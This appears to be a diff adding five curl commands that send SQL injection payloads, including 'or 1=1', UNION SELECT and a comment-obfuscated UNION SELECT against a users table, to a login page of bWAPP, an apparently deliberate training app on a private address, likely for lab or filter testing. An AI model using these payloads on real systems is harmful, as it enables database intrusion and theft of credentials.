@@ -1,0 +1,5 @@
+curl -k --resolve curl.ncurity.com:80:192.168.41.91 "http://curl.ncurity.com/bWAPP/login.php?id=101+or+1=1"
+curl -k --resolve curl.ncurity.com:80:192.168.41.91 "http://curl.ncurity.com/bWAPP/login.php?id=101+‘+or+1=1"
+curl -k --resolve curl.ncurity.com:80:192.168.41.91 "http://curl.ncurity.com/bWAPP/login.php?id=101+‘+or+1=1--"
+curl -k --resolve curl.ncurity.com:80:192.168.41.91 "http://curl.ncurity.com/bWAPP/login.php?id=1+union+select+1,2,3"
+curl -k --resolve curl.ncurity.com:80:192.168.41.91 "http://curl.ncurity.com/bWAPP/login.php?id=1/**/union/*/select/**/1,2,3/**/from/**/users?"
